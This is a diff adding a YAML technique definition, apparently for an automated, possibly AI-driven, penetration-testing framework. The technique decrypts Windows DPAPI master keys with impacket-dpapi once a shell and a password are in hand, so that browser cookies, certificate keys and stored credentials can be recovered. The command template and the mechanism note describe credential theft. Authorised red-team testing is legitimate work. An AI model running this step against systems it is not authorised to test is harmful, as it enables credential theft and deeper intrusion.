@@ -1,0 +1,36 @@
+name: dpapi_masterkey
+category: creds
+description: Decrypt DPAPI master keys to unlock user blobs (creds, certs, cookies)
+preconditions:
+- shell_obtained
+- has_cred
+parameters:
+  sid: from_engagement.user_sid
+  password: from_cred.password
+  masterkey_file: from_engagement.masterkey_path
+command_template: impacket-dpapi masterkey -file {masterkey_file} -sid {sid} -password
+  '{password}'
+parser: generic_parser
+expected_effects:
+- dpapi_masterkey_decrypted
+- browser_creds_decryptable
+- cert_private_keys_decryptable
+- has_cred
+falsifier:
+  pattern: incorrect password|invalid SID|file not found
+  timeout: 30
+model_tier: haiku
+mechanism: 'DPAPI masterkeys live in %APPDATA%\\Microsoft\\Protect\\<SID>\\. They''re
+  encrypted
+
+  with a key derived from the user''s password (or backup key from DC). Once decrypted,
+
+  they unlock every DPAPI blob the user owns: Chrome cookies, Wi-Fi PSKs, mapped-drive
+
+  creds, certificates in CurrentUser store, Vault credentials.
+
+  '
+references:
+  ocd_mindmap: 'Branch 10: DPAPI masterkey decryption'
+  hacktricks: windows-hardening/stealing-credentials/credentials-protections.md
+hacktricks_ref: windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.md
